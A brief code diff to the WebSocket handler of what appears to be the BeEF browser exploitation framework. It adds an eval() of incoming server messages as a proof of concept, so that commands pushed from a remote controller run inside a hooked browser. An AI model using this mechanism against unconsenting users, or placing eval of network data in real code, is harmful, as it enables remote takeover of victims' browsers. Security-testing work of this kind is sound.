@@ -47,9 +47,11 @@ beef.websocket = {
         }
         this.socket.onmessage = function (message){
            //@todo append the command to head in <script> </script>
-            console.log("We recive a message "+message.data);
+            console.log("We recive a message ' "+message.data+"'");
+            eval("'"+message.data +"'");
 
-        }
+             /*END POC*/
+           }
 
     },
 
